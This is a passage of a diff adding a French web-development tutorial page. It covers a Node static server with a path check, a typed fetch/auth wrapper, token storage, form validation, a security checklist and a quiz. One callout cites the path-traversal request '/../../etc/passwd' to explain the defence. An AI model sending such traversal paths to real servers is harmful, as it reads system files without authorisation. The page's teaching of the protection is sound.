+  &#x27;.css&#x27;: &#x27;text/css; charset=utf-8&#x27;,
+  &#x27;.svg&#x27;: &#x27;image/svg+xml&#x27;,
+};
+
+createServer(async (req, res) =&gt; {
+  const url = new URL(req.url ?? &#x27;/&#x27;, &#x27;http://localhost&#x27;);
+
+  if (url.pathname.startsWith(&#x27;/api/&#x27;)) {
+    // ... tes routes API
+    return;
+  }
+
+  const filePath = normalize(join(PUBLIC_DIR, url.pathname));
+  if (!filePath.startsWith(PUBLIC_DIR)) {
+    res.writeHead(403).end();
+    return;
+  }
+
+  try {
+    const file = await readFile(filePath);
+    res.writeHead(200, { &#x27;Content-Type&#x27;: MIME[extname(filePath)] ?? &#x27;application/octet-stream&#x27; });
+    res.end(file);
+  } catch {
+    const index = await readFile(join(PUBLIC_DIR, &#x27;index.html&#x27;));
+    res.writeHead(200, { &#x27;Content-Type&#x27;: MIME[&#x27;.html&#x27;]! });
+    res.end(index);
+  }
+}).listen(3000);</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 La vérification startsWith</div><p>Sans elle, une requête vers <code>/../../etc/passwd</code> pourrait lire un fichier hors de <code>public/</code> (faille <em>path traversal</em>). <code>normalize()</code> résout les <code>..</code>, puis on vérifie qu'on est toujours dans le bon dossier.</p></div>
+
+<table>
+<thead><tr><th></th><th>History API (<code>/projets/3</code>)</th><th>Hash (<code>/#/projets/3</code>)</th></tr></thead>
+<tbody>
+<tr><td>URL</td><td>Propre</td><td>Avec un <code>#</code></td></tr>
+<tr><td>Config serveur</td><td>Fallback vers index.html obligatoire</td><td>Aucune</td></tr>
+<tr><td>Événement</td><td><code>popstate</code></td><td><code>hashchange</code></td></tr>
+<tr><td>Pour IntraVerse</td><td>✅ Recommandé, tu contrôles le serveur</td><td>Si tu héberges en statique pur</td></tr>
+</tbody>
+</table>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Code ton routeur avec 4 routes (login, dashboard, projet avec <code>:id</code>, 404). Teste : clic sur un lien, bouton précédent du navigateur, rechargement de la page sur <code>/projets/2</code>, et URL inconnue.</p></div>
+</section>
+<section role="tabpanel" id="api" aria-labelledby="tab-api" hidden>
+<p class="kicker">Étape 8</p>
+<h1>Parler à l'API : fetch typé et authentification</h1>
+<p class="lead">Ton contrat d'API (étape 1 du sujet) définit les URI, les corps JSON et les codes HTTP. Côté front, une seule fonction centralise tous les appels : ajout du token, conversion JSON, gestion des erreurs.</p>
+
+<h2>Les DTO : le contrat en TypeScript</h2>
+<p>Tu traduis ton contrat d'API en interfaces. Si tu choisis le back Node en TypeScript, tu peux même partager ce dossier entre le front et le back.</p>
+<div class="code"><div class="code-head"><span class="code-title">src/types/api.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">export type Role = &#x27;student&#x27; | &#x27;trainer&#x27; | &#x27;admin&#x27;;
+
+export interface UserDto {
+  id: number;
+  firstName: string;
+  lastName: string;
+  role: Role;
+}
+
+export interface LoginRequest  { email: string; password: string }
+export interface LoginResponse { token: string; user: UserDto }
+
+export interface ApiErrorBody {
+  message: string;
+  errors?: Record&lt;string, string&gt;;  // erreurs de validation par champ (400)
+}</code></pre></div>
+
+<h2>La fonction <code>api&lt;T&gt;()</code></h2>
+<div class="code"><div class="code-head"><span class="code-title">src/core/api.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">export class ApiError extends Error {
+  constructor(
+    public status: number,
+    message: string,
+    public details?: unknown,
+  ) {
+    super(message);
+    this.name = &#x27;ApiError&#x27;;
+  }
+}
+
+let token: string | null = null;
+export const setToken = (t: string | null) =&gt; { token = t; };
+
+export async function api&lt;T&gt;(path: string, init: RequestInit = {}): Promise&lt;T&gt; {
+  const headers = new Headers(init.headers);
+  headers.set(&#x27;Accept&#x27;, &#x27;application/json&#x27;);
+  if (init.body &amp;&amp; !(init.body instanceof FormData)) {
+    headers.set(&#x27;Content-Type&#x27;, &#x27;application/json&#x27;);
+  }
+  if (token) headers.set(&#x27;Authorization&#x27;, `Bearer ${token}`);
+
+  const res = await fetch(`/api${path}`, { ...init, headers });
+
+  if (res.status === 204) return undefined as T;
+
+  const data: unknown = await res.json().catch(() =&gt; null);
+
+  if (!res.ok) {
+    if (res.status === 401) {
+      setToken(null);
+      window.dispatchEvent(new CustomEvent(&#x27;auth:expired&#x27;));
+    }
+    const message =
+      typeof data === &#x27;object&#x27; &amp;&amp; data !== null &amp;&amp; &#x27;message&#x27; in data
+        ? String(data.message)
+        : res.statusText;
+    throw new ApiError(res.status, message, data);
+  }
+  return data as T;
+}
+
+export const get = &lt;T&gt;(path: string) =&gt; api&lt;T&gt;(path);
+export const post = &lt;T&gt;(path: string, body: unknown) =&gt;
+  api&lt;T&gt;(path, { method: &#x27;POST&#x27;, body: JSON.stringify(body) });</code></pre></div>
+<ul>
+<li><strong>Le générique <code>T</code></strong> : <code>get&lt;UserDto&gt;('/me')</code> renvoie une <code>Promise&lt;UserDto&gt;</code>. Attention, c'est une <em>promesse</em> faite à TypeScript, pas une vérification : si l'API renvoie autre chose, tu ne le sauras pas avant l'exécution.</li>
+<li><strong><code>fetch</code> ne rejette pas sur un 404 ou un 500</strong>, seulement sur une erreur réseau. D'où le test <code>if (!res.ok)</code> et notre propre <code>ApiError</code>.</li>
+<li><strong>Le 204 No Content</strong> n'a pas de corps : appeler <code>res.json()</code> dessus planterait.</li>
+<li><strong>401</strong> : le token est expiré, on émet un événement global. Le <code>main.ts</code> l'écoute et redirige vers <code>/login</code>.</li>
+</ul>
+
+<h2>Que faire de chaque code HTTP ?</h2>
+<table>
+<thead><tr><th>Code</th><th>Signification</th><th>Réaction de l'interface</th></tr></thead>
+<tbody>
+<tr><td><code>200</code> / <code>201</code></td><td>OK / Créé</td><td>Afficher, mettre à jour le store, message de succès</td></tr>
+<tr><td><code>204</code></td><td>OK, pas de contenu</td><td>Retirer l'élément supprimé de la liste</td></tr>
+<tr><td><code>400</code></td><td>Données invalides</td><td>Afficher <code>errors</code> sous chaque champ du formulaire</td></tr>
+<tr><td><code>401</code></td><td>Non authentifié</td><td>Vider la session, rediriger vers <code>/login</code></td></tr>
+<tr><td><code>403</code></td><td>Authentifié mais interdit</td><td>Page « Accès refusé » (ne pas déconnecter)</td></tr>
+<tr><td><code>404</code></td><td>Ressource introuvable</td><td>Page ou message « introuvable »</td></tr>
+<tr><td><code>409</code></td><td>Conflit</td><td>« Ce rendu existe déjà » / « email déjà utilisé »</td></tr>
+<tr><td><code>500</code></td><td>Erreur serveur</td><td>Message générique + bouton « Réessayer ». Ne jamais afficher le détail technique</td></tr>
+</tbody>
+</table>
+
+<h2>Où stocker le token ?</h2>
+<p>Le sujet impose <code>Authorization: Bearer &lt;token&gt;</code>. Le choix du stockage côté navigateur a des conséquences de sécurité :</p>
+<table>
+<thead><tr><th>Stockage</th><th>Survit au rechargement</th><th>Lisible par un script XSS</th><th>Verdict</th></tr></thead>
+<tbody>
+<tr><td>Variable en mémoire</td><td>❌ Non</td><td>Plus difficile</td><td>Le plus sûr, mais reconnexion à chaque rechargement (sauf refresh token en cookie)</td></tr>
+<tr><td><code>sessionStorage</code></td><td>✅ Oui (même onglet)</td><td>⚠️ Oui</td><td>Compromis acceptable pour un projet d'école</td></tr>
+<tr><td><code>localStorage</code></td><td>✅ Oui (tous onglets)</td><td>⚠️ Oui</td><td>Pratique mais le plus exposé</td></tr>
+<tr><td>Cookie <code>HttpOnly</code></td><td>✅ Oui</td><td>✅ Non</td><td>Le plus robuste, mais ce n'est plus un en-tête Bearer : à justifier dans ton CDC</td></tr>
+</tbody>
+</table>
+<div class="callout warn"><div class="callout-title">⚠️ Quel que soit ton choix</div><p>Le vrai rempart reste l'absence de XSS (étape 4) : un script injecté peut de toute façon agir à la place de l'utilisateur. Garde aussi une durée de vie courte au JWT, et ne mets jamais d'information sensible dans son contenu : il est seulement encodé en base64, pas chiffré (tu peux le lire sur jwt.io).</p></div>
+
+<div class="code"><div class="code-head"><span class="code-title">src/services/auth.ts</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { post, setToken } from &#x27;../core/api.js&#x27;;
+import type { LoginRequest, LoginResponse } from &#x27;../types/api.js&#x27;;
+
+export async function login(credentials: LoginRequest): Promise&lt;void&gt; {
+  const { token, user } = await post&lt;LoginResponse&gt;(&#x27;/auth/login&#x27;, credentials);
+  setToken(token);
+  sessionStore.set({ user });
+  router.navigate(&#x27;/&#x27;);
+}
+
+window.addEventListener(&#x27;auth:expired&#x27;, () =&gt; {
+  sessionStore.set({ user: null });
+  router.navigate(&#x27;/login&#x27;);
+});</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 import type</div><p><code>import type</code> importe seulement des types : la ligne disparaît du JavaScript généré. Le navigateur ne tente pas de charger un fichier qui ne contient que des interfaces.</p></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Traduis 3 routes de ton contrat d'API en DTO TypeScript. En attendant le back, crée un faux serveur : un dossier <code>public/api/</code> avec des fichiers JSON (<code>me.json</code>, <code>projects.json</code>) et appelle-les avec <code>get()</code>. Tu pourras brancher le vrai back sans toucher à tes composants.</p></div>
+</section>
+<section role="tabpanel" id="forms" aria-labelledby="tab-forms" hidden>
+<p class="kicker">Étape 9</p>
+<h1>Formulaires : saisie, validation, envoi</h1>
+<p class="lead">Login, soumission de rendu, saisie de notes : IntraVerse est rempli de formulaires. Le HTML natif fait déjà beaucoup de travail, il suffit de le compléter.</p>
+
+<h2>Commencer par le HTML</h2>
+<div class="code"><div class="code-head"><span class="code-title">Formulaire de rendu</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-html">&lt;form id=&quot;submit-form&quot; class=&quot;card p-6 stack-4&quot; data-project-id=&quot;12&quot; novalidate&gt;
+  &lt;div class=&quot;stack-2&quot;&gt;
+    &lt;label for=&quot;repoUrl&quot;&gt;Lien du dépôt GitHub&lt;/label&gt;
+    &lt;input id=&quot;repoUrl&quot; name=&quot;repoUrl&quot; type=&quot;url&quot; required
+           placeholder=&quot;https://github.com/pseudo/depot&quot;
+           aria-describedby=&quot;repoUrl-error&quot;&gt;
+    &lt;p id=&quot;repoUrl-error&quot; class=&quot;field-error&quot; aria-live=&quot;polite&quot;&gt;&lt;/p&gt;
+  &lt;/div&gt;
+
+  &lt;div class=&quot;stack-2&quot;&gt;
+    &lt;label for=&quot;comment&quot;&gt;Commentaire &lt;span class=&quot;text-muted&quot;&gt;(facultatif)&lt;/span&gt;&lt;/label&gt;
+    &lt;textarea id=&quot;comment&quot; name=&quot;comment&quot; rows=&quot;4&quot; maxlength=&quot;2000&quot;&gt;&lt;/textarea&gt;
+  &lt;/div&gt;
+
+  &lt;button class=&quot;btn btn-primary&quot; type=&quot;submit&quot;&gt;Envoyer mon rendu&lt;/button&gt;
+&lt;/form&gt;</code></pre></div>
+<ul>
+<li><code>label for</code> + <code>id</code> : cliquer le libellé active le champ, et le lecteur d'écran le lit.</li>
+<li><code>type="url"</code>, <code>required</code>, <code>maxlength</code> : validation native gratuite.</li>
+<li><code>novalidate</code> : on désactive les bulles du navigateur pour afficher nos propres messages, tout en gardant l'API de validation.</li>
+<li><code>aria-live="polite"</code> : le message d'erreur est annoncé au lecteur d'écran quand il apparaît.</li>
+</ul>
+
+<h2>La logique en TypeScript</h2>
+<div class="code"><div class="code-head"><span class="code-title">Version minimale</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">import { post, ApiError } from &#x27;../core/api.js&#x27;;
+
+interface SubmissionDto { projectId: number; repoUrl: string; comment: string }
+interface Submission extends SubmissionDto { id: number; status: &#x27;pending&#x27; | &#x27;late&#x27; | &#x27;graded&#x27; }
+
+const form = document.querySelector&lt;HTMLFormElement&gt;(&#x27;#submit-form&#x27;)!;
+
+form.addEventListener(&#x27;submit&#x27;, async (e) =&gt; {
+  e.preventDefault();
+  const data = new FormData(form);
+  const repoUrl = String(data.get(&#x27;repoUrl&#x27;) ?? &#x27;&#x27;).trim();
+  const urlInput = form.elements.namedItem(&#x27;repoUrl&#x27;) as HTMLInputElement;
+
+  if (!/^https:\/\/github\.com\/[\w.-]+\/[\w.-]+\/?$/.test(repoUrl)) {
+    urlInput.setCustomValidity(&#x27;Lien GitHub invalide (https://github.com/pseudo/depot)&#x27;);
+    urlInput.reportValidity();
+    return;
+  }
+  urlInput.setCustomValidity(&#x27;&#x27;);
+
+  try {
+    const created = await post&lt;Submission&gt;(&#x27;/submissions&#x27;, {
+      projectId: Number(form.dataset.projectId),
+      repoUrl,
+      comment: String(data.get(&#x27;comment&#x27;) ?? &#x27;&#x27;),
+    } satisfies SubmissionDto);
+    console.log(created.status);
+  } catch (err) {
+    if (err instanceof ApiError &amp;&amp; err.status === 409) {
+      console.warn(&#x27;Rendu déjà existant&#x27;);
+    } else throw err;
+  }
+});</code></pre></div>
+<p>Points clés :</p>
+<ul>
+<li><code>new FormData(form)</code> récupère tous les champs par leur <code>name</code>, comme <code>$request-&gt;request-&gt;get()</code> en Symfony.</li>
+<li><code>satisfies SubmissionDto</code> vérifie que l'objet correspond au DTO, sans changer son type. Si tu oublies un champ, TypeScript le signale.</li>
+<li><code>setCustomValidity()</code> branche ta règle sur l'API de validation native : <code>form.checkValidity()</code> en tient compte.</li>
+</ul>
+
+<h2>Version complète : erreurs affichées et bouton bloqué</h2>
+<div class="code"><div class="code-head"><span class="code-title">Gestion complète</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-ts">function showErrors(form: HTMLFormElement, errors: Record&lt;string, string&gt;): void {
+  for (const input of form.querySelectorAll&lt;HTMLInputElement&gt;(&#x27;[name]&#x27;)) {
+    const message = errors[input.name] ?? &#x27;&#x27;;
+    input.setAttribute(&#x27;aria-invalid&#x27;, String(message !== &#x27;&#x27;));
+    const slot = form.querySelector(`#${input.id}-error`);
+    if (slot) slot.textContent = message;     // textContent : pas de XSS
+  }
+}
+
+form.addEventListener(&#x27;submit&#x27;, async (e) =&gt; {
+  e.preventDefault();
+  const button = form.querySelector&lt;HTMLButtonElement&gt;(&#x27;[type=&quot;submit&quot;]&#x27;)!;
+
+  // 1. Validation native (required, type=&quot;url&quot;…)
+  if (!form.checkValidity()) {
+    const errors: Record&lt;string, string&gt; = {};
+    for (const input of form.querySelectorAll&lt;HTMLInputElement&gt;(&#x27;[name]&#x27;)) {
+      if (!input.validity.valid) errors[input.name] = input.validationMessage;
+    }
+    return showErrors(form, errors);
+  }
+
+  // 2. Envoi : on bloque le bouton pour éviter le double clic
+  button.disabled = true;
+  button.textContent = &#x27;Envoi…&#x27;;
+  try {
+    await post(&#x27;/submissions&#x27;, Object.fromEntries(new FormData(form)));
+    showErrors(form, {});
+    form.reset();
+  } catch (err) {
+    // 3. Erreurs renvoyées par le serveur (400 avec détail par champ)
+    if (err instanceof ApiError &amp;&amp; err.status === 400) {
+      const body = err.details as ApiErrorBody;
+      showErrors(form, body.errors ?? {});
+    } else {
+      throw err;
+    }
+  } finally {
+    button.disabled = false;
+    button.textContent = &#x27;Envoyer mon rendu&#x27;;
+  }
+});</code></pre></div>
+<div class="code"><div class="code-head"><span class="code-title">Styles liés à l&#x27;état</span><button class="copy" type="button">Copier</button></div><pre><code class="lang-css">@layer components {
+  [aria-invalid=&quot;true&quot;] { border-color: var(--color-danger); }
+  .field-error { color: var(--color-danger); font-size: var(--text-sm); min-height: 1.25em; }
+}</code></pre></div>
+<div class="callout tip"><div class="callout-title">💡 Styler l'état via les attributs ARIA</div><p>Au lieu d'ajouter une classe <code>.is-invalid</code>, on style directement <code>[aria-invalid="true"]</code>. Un seul attribut sert à la fois à l'accessibilité et au style : impossible que les deux se désynchronisent.</p></div>
+<div class="callout danger"><div class="callout-title">⛔ La validation front ne protège rien</div><p>Elle améliore l'expérience utilisateur. Le serveur doit refaire <strong>toutes</strong> les vérifications (format, échéance dépassée, droit de rendre ce projet…), car n'importe qui peut envoyer une requête avec curl.</p></div>
+
+<div class="callout todo"><div class="callout-title">🛠️ À toi de jouer</div><p>Code l'écran de connexion avec ces principes : validation de l'email, affichage de « Identifiants incorrects » sur un 401, bouton désactivé pendant l'envoi, et redirection vers le dashboard en cas de succès.</p></div>
+</section>
+<section role="tabpanel" id="recap" aria-labelledby="tab-recap" hidden>
+<p class="kicker">Étape 10</p>
+<h1>Récapitulatif, plan de route et quiz</h1>
+
+<h2>Ton framework en un coup d'œil</h2>
+<table>
+<thead><tr><th>Fichier</th><th>Rôle</th><th>Taille indicative</th></tr></thead>
+<tbody>
+<tr><td><code>tokens.css</code></td><td>Variables : couleurs, typo, espacements, thème sombre</td><td>~80 lignes</td></tr>
+<tr><td><code>utilities.css</code></td><td>Classes à une seule responsabilité + préfixes responsive</td><td>~200 lignes</td></tr>
+<tr><td><code>components.css</code></td><td><code>.btn</code>, <code>.card</code>, <code>.badge</code>, formulaires</td><td>~150 lignes</td></tr>
+<tr><td><code>dom.ts</code></td><td><code>h()</code> et <code>$()</code></td><td>~35 lignes</td></tr>
+<tr><td><code>component.ts</code></td><td>Cycle de vie + nettoyage</td><td>~40 lignes</td></tr>
+<tr><td><code>store.ts</code></td><td>État + abonnements</td><td>~25 lignes</td></tr>
+<tr><td><code>router.ts</code></td><td>History API, paramètres, gardes</td><td>~90 lignes</td></tr>
+<tr><td><code>api.ts</code></td><td>fetch typé, token, erreurs</td><td>~45 lignes</td></tr>
+</tbody>
+</table>
+<p>Moins de 300 lignes de TypeScript pour le noyau. C'est le message que tu peux défendre à la revue d'architecture : tu sais exactement ce que fait chaque ligne.</p>
+
+<h2>Dans quel ordre construire IntraVerse</h2>
+<ol class="roadmap">
+<li><strong>Tokens + page styleguide</strong> à partir du Manifeste UI. Tu as un résultat visible dès le premier jour.</li>
+<li><strong>Utilitaires et composants CSS</strong> nécessaires aux maquettes (login, dashboard).</li>
+<li><strong><code>dom.ts</code> + <code>component.ts</code></strong>, testés sur une page statique.</li>
+<li><strong>Routeur</strong> avec des pages vides, puis le serveur avec fallback.</li>
+<li><strong><code>api.ts</code> + faux JSON</strong>, puis l'écran de login complet.</li>
+<li><strong>Stores</strong> session et UI, gardes de route par rôle.</li>
+<li>Les écrans métier, un rôle à la fois : <strong>étudiant</strong>, puis <strong>formateur</strong>, puis <strong>admin</strong>.</li>
+</ol>
+
+<h2>Checklist sécurité et qualité</h2>
+<ul class="checklist">
+<li>Aucun <code>innerHTML</code> avec une donnée extérieure</li>
+<li>Toutes les vérifications de droits sont refaites côté serveur</li>
+<li>Le 401 déconnecte, le 403 affiche « Accès refusé »</li>
+<li>Les écouteurs sont nettoyés (<code>AbortController</code>)</li>
+<li>Chaque champ a un <code>&lt;label&gt;</code>, les erreurs ont <code>aria-live</code></li>
+<li>Le focus est déplacé sur le titre à chaque changement de page</li>
+<li>Contrastes vérifiés dans les deux thèmes</li>
+<li>Responsive testé à 375 px, 768 px et 1440 px</li>
+<li>Aucune valeur de couleur ou d'espacement en dur hors de <code>tokens.css</code></li>
+</ul>
+
+<h2>Quiz</h2>
+<p>10 questions pour vérifier que tout est clair. Tu peux recommencer autant de fois que tu veux.</p>
+<div id="quiz"></div>
+
+<div class="callout info"><div class="callout-title">🔗 Ressources du sujet</div><ul><li><a href="https://developer.mozilla.org/fr/docs/Web/CSS/CSS_cascading_variables/Using_CSS_custom_properties" target="_blank" rel="noopener">MDN : variables CSS</a></li><li><a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/" target="_blank" rel="noopener">CSS-Tricks : Flexbox</a></li><li><a href="https://developer.mozilla.org/fr/docs/Web/API/History_API" target="_blank" rel="noopener">MDN : History API</a></li><li><a href="https://www.typescriptlang.org/docs/handbook/intro.html" target="_blank" rel="noopener">TypeScript Handbook</a></li><li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10</a></li></ul></div>
+</section>
+<div class="nav-steps"><button id="prev" type="button"></button><button id="next" type="button"></button></div>
+</main>
+</div>
+<script>
+(() => {
+  /* ── Coloration syntaxique ── */
+  const esc = (s) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  const KW = 'abstract|as|async|await|break|case|catch|class|const|constructor|continue|default|else|export|extends|false|finally|for|from|function|get|if|implements|import|in|instanceof|interface|keyof|let|new|null|of|private|protected|public|readonly|return|satisfies|set|static|super|switch|this|throw|true|try|type|typeof|undefined|void|while';
+  const RULES = {
+    ts: [['t-com',/\/\/[^\n]*|\/\*[\s\S]*?\*\//y],['t-str',/'(?:\\.|[^'\\\n])*'|"(?:\\.|[^"\\\n])*"|`(?:\\.|[^`\\])*`/y],['t-kw',new RegExp('\\b(?:'+KW+')\\b','y')],['t-num',/\b\d+(?:\.\d+)?\b/y],['t-type',/\b[A-Z][A-Za-z0-9_]*\b/y],['t-fn',/\b[a-z_$][\w$]*(?=\s*[<(])/y]],
+    css: [['t-com',/\/\*[\s\S]*?\*\//y],['t-str',/'[^']*'|"[^"]*"/y],['t-at',/@[\w-]+/y],['t-var',/--[\w-]+/y],['t-prop',/[a-z-]+(?=\s*:[^:{]*[;}])/y],['t-num',/-?\b\d*\.?\d+(?:px|rem|em|ms|%|vw|vh|fr|s)?\b/y],['t-sel',/[.#][\w\\:-]+/y]],
+    html: [['t-com',/<!--[\s\S]*?-->/y],['t-tag',/<\/?[\w-]+|\/?>/y],['t-attr',/\b[\w-]+(?==)/y],['t-str',/"[^"]*"/y]],
+    json: [['t-attr',/"[^"]*"(?=\s*:)/y],['t-str',/"[^"]*"/y],['t-kw',/\b(?:true|false|null)\b/y],['t-num',/\b\d+\b/y]],
+    bash: [['t-com',/#[^\n]*/y],['t-kw',/\b(?:npm|npx|cd)\b/y]],
+  };
+  RULES.tsx = RULES.ts;
+  function highlight(text, lang) {
+    const rules = RULES[lang]; if (!rules) return esc(text);
+    let out = '', i = 0, plain = '';
+    outer: while (i < text.length) {
+      for (const [cls, re] of rules) {
+        re.lastIndex = i; const m = re.exec(text);
+        if (m && m[0].length) { out += esc(plain) + '<span class="'+cls+'">'+esc(m[0])+'</span>'; plain=''; i += m[0].length; continue outer; }
+      }
+      // avance d'un mot entier pour éviter de couper un identifiant
+      const w = /[A-Za-z0-9_$]+|[\s\S]/y; w.lastIndex = i; const m = w.exec(text); plain += m[0]; i += m[0].length;
+    }
+    return out + esc(plain);
+  }
+  document.querySelectorAll('pre code').forEach((el) => {
+    const lang = (el.className.match(/lang-(\w+)/) || [])[1];
+    el.innerHTML = highlight(el.textContent, lang);
+  });
+
+  /* ── Boutons copier ── */
+  document.addEventListener('click', async (e) => {
+    const btn = e.target.closest('.copy'); if (!btn) return;
+    const text = btn.closest('.code').querySelector('code').textContent;
+    try { await navigator.clipboard.writeText(text); btn.textContent = 'Copié ✓'; }
+    catch { btn.textContent = 'Échec'; }
+    btn.classList.add('ok');
+    setTimeout(() => { btn.textContent = 'Copier'; btn.classList.remove('ok'); }, 1500);
+  });
+
+  /* ── Onglets par étape ── */
+  const tabs = [...document.querySelectorAll('[role=tab]')];
+  const panels = [...document.querySelectorAll('[role=tabpanel]')];
+  const prev = document.getElementById('prev'), next = document.getElementById('next');
+  const meterText = document.getElementById('meter-text'), meterBar = document.getElementById('meter-bar');
+  const sidebar = document.querySelector('.sidebar');
+  const visited = new Set();
+  let current = 0;
+  function show(i, focus) {
+    current = i;
+    tabs.forEach((t, k) => { t.setAttribute('aria-selected', k === i); t.tabIndex = k === i ? 0 : -1; });
+    panels.forEach((p, k) => { p.hidden = k !== i; });
+    visited.add(i); tabs[i].classList.add('done');
+    meterText.textContent = `Étape ${i + 1} / ${tabs.length} · ${visited.size} vue${visited.size > 1 ? 's' : ''}`;
+    meterBar.style.width = (visited.size / tabs.length * 100) + '%';
+    prev.hidden = i === 0; next.hidden = i === tabs.length - 1;
+    prev.textContent = i > 0 ? '← ' + tabs[i - 1].dataset.short : '';
+    next.textContent = i < tabs.length - 1 ? tabs[i + 1].dataset.short + ' →' : '';
+    history.replaceState(null, '', '#etape-' + panels[i].id);
+    window.scrollTo({ top: 0, behavior: 'instant' });
+    sidebar.classList.remove('open');
+    if (focus) tabs[i].focus();
+    onScroll();
+  }
+  tabs.forEach((t, i) => t.addEventListener('click', () => show(i)));
+  document.querySelector('[role=tablist]').addEventListener('keydown', (e) => {
+    const k = { ArrowDown: 1, ArrowUp: -1 }[e.key]; if (!k) return;
+    e.preventDefault(); show((current + k + tabs.length) % tabs.length, true);
+  });
+  prev.addEventListener('click', () => show(current - 1));
+  next.addEventListener('click', () => show(current + 1));
+  document.querySelector('.menu-btn').addEventListener('click', () => sidebar.classList.toggle('open'));
+
+  /* ── Barre de progression de lecture ── */
+  const progress = document.querySelector('.progress');
+  function onScroll() {
+    const max = document.documentElement.scrollHeight - innerHeight;
+    progress.style.width = (max > 0 ? scrollY / max * 100 : 100) + '%';
+  }
+  addEventListener('scroll', onScroll, { passive: true });
+
+
+  /* ── Playground des utilitaires ── */
+  const CLASSES = ['bg-surface','p-4','p-6','border','rounded','shadow','stack-2','flex','items-center','justify-between','gap-4'];
+  const card = document.getElementById('pg-card'), out = document.getElementById('pg-output');
+  const controls = document.getElementById('pg-controls');
+  const initial = new Set(['bg-surface','p-4','rounded','stack-2']);
+  CLASSES.forEach((c) => {
+    const id = 'pg-' + c;
+    controls.insertAdjacentHTML('beforeend', `<label for="${id}"><input type="checkbox" id="${id}" value="${c}" ${initial.has(c) ? 'checked' : ''}>.${c}</label>`);
+  });
+  function syncPg() {
+    const on = [...controls.querySelectorAll('input:checked')].map((i) => i.value);
+    card.className = 'pgc ' + on.join(' ');
+    out.textContent = `<article class="${on.join(' ')}">`;
+  }
+  controls.addEventListener('change', syncPg); syncPg();
+
+  /* ── Démo du store (même logique que le cours, en JS) ── */
+  class Store {
+    #listeners = new Set();
+    constructor(state) { this.state = state; }
+    get() { return this.state; }
+    set(patch) {
+      const prev = this.state;
+      this.state = { ...prev, ...(typeof patch === 'function' ? patch(prev) : patch) };
+      this.#listeners.forEach((fn) => fn(this.state, prev));
+    }
+    subscribe(fn) { this.#listeners.add(fn); return () => this.#listeners.delete(fn); }
+  }
+  class Component {
+    #abort = new AbortController();
+    constructor(props) { this.props = props; this.root = null; }
+    get signal() { return this.#abort.signal; }
+    mount(c) { this.root = this.render(); c.replaceChildren(this.root); this.onMount(); }
+    update() {
+      this.#abort.abort(); this.#abort = new AbortController();
+      const n = this.render(); this.root.replaceWith(n); this.root = n; this.onMount();
+    }
+    onMount() {}
+  }
+  const h = (tag, props = {}, ...kids) => {
+    const el = document.createElement(tag); const { class: c, ...rest } = props;
+    if (c) el.className = c; Object.assign(el, rest);
+    kids.forEach((k) => k !== false && k != null && el.append(k)); return el;
+  };
+  const store = new Store({ count: 0 });
+  const log = document.getElementById('demo-log');
+  const write = (msg) => { log.textContent = msg + '\n' + log.textContent; };
+  class CounterA extends Component {
+    render() {
+      return h('div', { class: 'demo-card' }, h('h4', {}, 'Composant A'),
+        h('div', { class: 'big' }, String(store.get().count)),
+        h('button', { type: 'button' }, '+1'), h('button', { type: 'button', className: 'ghost' }, 'Remise à zéro'));
+    }
+    onMount() {
+      const [inc, reset] = this.root.querySelectorAll('button');
+      inc.addEventListener('click', () => store.set((s) => ({ count: s.count + 1 })), { signal: this.signal });
+      reset.addEventListener('click', () => store.set({ count: 0 }), { signal: this.signal });
+    }
+  }
+  class ParityB extends Component {
+    render() {
+      const n = store.get().count;
+      return h('div', { class: 'demo-card' }, h('h4', {}, 'Composant B'),
+        h('p', {}, `Le compteur vaut ${n} : il est ${n % 2 === 0 ? 'pair' : 'impair'}.`),
+        h('p', { style: 'color:var(--muted);font-size:.85rem' }, 'B ne contient aucun bouton : il est seulement abonné au store.'));
+    }
+  }
+  const a = new CounterA({}), b = new ParityB({});
+  a.mount(document.getElementById('demo-a')); b.mount(document.getElementById('demo-b'));
+  store.subscribe((s, p) => { write(`set() : count ${p.count} → ${s.count}  ·  A.update()  ·  B.update()`); a.update(); b.update(); });
+  write('Store créé avec { count: 0 } · 2 abonnés');
+
+  /* ── Quiz ── */
+  const QUIZ = [{"q": "Pourquoi écrire <code>import { h } from './dom.js'</code> dans un fichier <code>.ts</code> ?", "opts": ["C'est une faute de frappe, il faut écrire .ts", "Le navigateur charge le fichier .js généré et ne devine pas les extensions", "TypeScript ne compile que les fichiers .js", "Pour que le fichier soit mis en cache"], "a": 1, "exp": "Sans bundler, le navigateur charge exactement l'URL écrite. TypeScript comprend que <code>dom.js</code> correspond à <code>dom.ts</code>."}, {"q": "Quel est l'avantage principal des couleurs en HSL pour un design system ?", "opts": ["Elles sont plus rapides à afficher", "On crée une variante plus claire ou plus foncée en changeant un seul pourcentage", "Elles sont obligatoires avec les variables CSS", "Elles prennent moins de place"], "a": 1, "exp": "La luminosité (le L) est un paramètre séparé : un hover = baisser la luminosité."}, {"q": "À quoi sert <code>@layer reset, base, components, utilities;</code> ?", "opts": ["À charger les fichiers CSS dans l'ordre", "À fixer la priorité : une utilitaire gagne toujours sur un composant, quelle que soit la spécificité", "À créer des calques visuels (z-index)", "À minifier le CSS"], "a": 1, "exp": "La dernière couche déclarée l'emporte, même contre un sélecteur plus spécifique d'une couche précédente."}, {"q": "Comment écrit-on la classe <code>md:flex</code> dans le fichier CSS ?", "opts": [".md:flex", ".md\\:flex", ".md-flex", "[md:flex]"], "a": 1, "exp": "Le <code>:</code> a un sens en CSS (pseudo-classe) : il faut l'échapper avec un antislash."}, {"q": "Un étudiant écrit un commentaire contenant du HTML. Quelle méthode l'affiche sans risque ?", "opts": ["element.innerHTML = comment", "element.textContent = comment", "element.outerHTML = comment", "document.write(comment)"], "a": 1, "exp": "<code>textContent</code> crée un nœud texte : rien n'est interprété comme du HTML."}, {"q": "Pourquoi passer <code>{ signal }</code> à 